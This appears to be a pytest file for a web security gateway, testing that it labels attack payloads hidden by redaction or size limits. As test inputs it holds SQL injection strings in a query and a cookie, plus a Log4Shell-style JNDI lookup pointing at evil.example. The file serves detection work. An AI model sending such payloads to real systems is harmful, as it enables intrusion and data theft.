"""ADR-0007 C: the Gate labels attack shapes that its own masking / size limits hid from the server (classes only).

Audit #20 (``token:`` in front of a payload masks it), #31 (Cookie / X-Api-Key values masked wholesale), #21 (a
payload padded past the capture limit). A payload the server can still read gets no label (no double alert).
"""

from __future__ import annotations

from gate_helpers import FakeServer, GateFactory, client_for, events_of

from tokiwa import payload_shapes

LABEL = payload_shapes.HIDDEN_SIGNALS_LABEL


async def _event(make_gate: GateFactory, fake_server: FakeServer, **request: object) -> dict:
    app, gate = await make_gate()
    async with client_for(app) as c:
        await c.request(**request)  # type: ignore[arg-type]
    (event,) = await events_of(gate, fake_server)
    return event


async def test_payload_behind_secret_key_is_labelled(make_gate: GateFactory, fake_server: FakeServer) -> None:
    event = await _event(make_gate, fake_server, method="GET", url="/search?q=token:' OR 1=1--")
    assert "[REDACTED" in event["http"]["query"]  # still masked: the value is not shipped
    assert payload_shapes.parse_label(event["labels"][LABEL]) == [("sqli", "query")]
    assert "gate:hidden_signals" in event["tags"]


async def test_payload_in_cookie_is_labelled(make_gate: GateFactory, fake_server: FakeServer) -> None:
    event = await _event(
        make_gate,
        fake_server,
        method="GET",
        url="/",
        headers={"Cookie": "sid=1' UNION SELECT password FROM users--"},
    )
    assert event["http"]["headers"]["cookie"].startswith("[REDACTED")
    assert ("sqli", "header:cookie") in payload_shapes.parse_label(event["labels"][LABEL])


async def test_payload_padded_past_the_capture_limit(make_gate: GateFactory, fake_server: FakeServer) -> None:
    body = "a=" + "x" * 6000 + "&b=${jndi:ldap://evil.example/a}"
    event = await _event(
        make_gate,
        fake_server,
        method="POST",
        url="/form",
        content=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert "jndi" not in (event["http"].get("request_body") or "")
    assert ("template", "body_beyond") in payload_shapes.parse_label(event["labels"][LABEL])


async def test_visible_payload_is_not_labelled_twice(make_gate: GateFactory, fake_server: FakeServer) -> None:
    event = await _event(make_gate, fake_server, method="GET", url="/search?q=1' OR 1=1--")
    assert "1=1--" in event["http"]["query"]  # unmasked: the server's detectors see it themselves
    assert LABEL not in event["labels"]


async def test_benign_masked_values_are_not_labelled(make_gate: GateFactory, fake_server: FakeServer) -> None:
    event = await _event(
        make_gate,
        fake_server,
        method="GET",
        url="/login?token=abc123def456&password=hunter2",
        headers={"Cookie": "sid=s%3Aabcdef.0123456789", "Authorization": "Bearer eyJabc.def.ghi"},
    )
    assert LABEL not in event["labels"]


def test_classifier_and_label_round_trip() -> None:
    assert payload_shapes.classify("1%27%20OR%201%3D1--") == {"sqli"}
    assert payload_shapes.classify("${jndi:ldap://x}") == {"template", "ssrf"}
    assert payload_shapes.classify("plain text, nothing here") == set()
    assert payload_shapes.hidden_classes("q=1' or 1=1", "q=1' or 1=1") == set()
    label = payload_shapes.format_label({"query": {"sqli", "xss"}, "header:cookie": {"sqli"}})
    assert label == "sqli@header:cookie,sqli@query,xss@query"
    assert payload_shapes.parse_label(label + ",bogus@x,noat") == [
        ("sqli", "header:cookie"),
        ("sqli", "query"),
        ("xss", "query"),
    ]


def _benign_exchanges() -> list[tuple[str, object]]:
    import json
    from pathlib import Path

    from tokiwa.gate.capture import BodyCapture, Exchange

    cases = json.loads((Path(__file__).parents[1] / "detect" / "fixtures" / "web_benign.json").read_text())[
        "cases"
    ]
    out = []
    for c in cases:
        headers = [
            (b"host", b"shop.example"),
            (b"user-agent", b"Mozilla/5.0 (X11; Linux x86_64) Chrome/130.0"),
        ]
        headers += [(k.encode("latin-1"), v.encode("latin-1")) for k, v in (c.get("headers") or {}).items()]
        if c.get("content_type"):
            headers.append((b"content-type", c["content_type"].encode("latin-1")))
        body = BodyCapture(4096)
        if c.get("body"):
            body.feed(c["body"].encode("utf-8"))
        body.complete = True
        ex = Exchange(
            method=c.get("method", "GET"),
            scheme="https",
            path=c.get("path", "/"),
            query=c.get("query") or "",
            raw_headers=headers,
            client_ip="203.0.113.7",
            client_port=40000,
            body=body,
        )
        ex.status = c.get("status", 200)
        out.append((c["name"], ex))
    return out


def test_benign_fixtures_raise_no_hidden_signal(settings) -> None:  # type: ignore[no-untyped-def]
    """False-positive guard: the 51 benign web fixtures (browsing, APIs, cookies, tokens) get no label."""
    from tokiwa.gate.capture import EventBuilder

    builder = EventBuilder(sensor_id="gate-x", capture_body_bytes=4096, redaction=settings.llm.redaction)
    flagged = {
        name: ev.labels[LABEL]
        for name, ex in _benign_exchanges()
        for ev in builder.build(ex)
        if LABEL in ev.labels
    }  # type: ignore[arg-type]
    assert flagged == {}
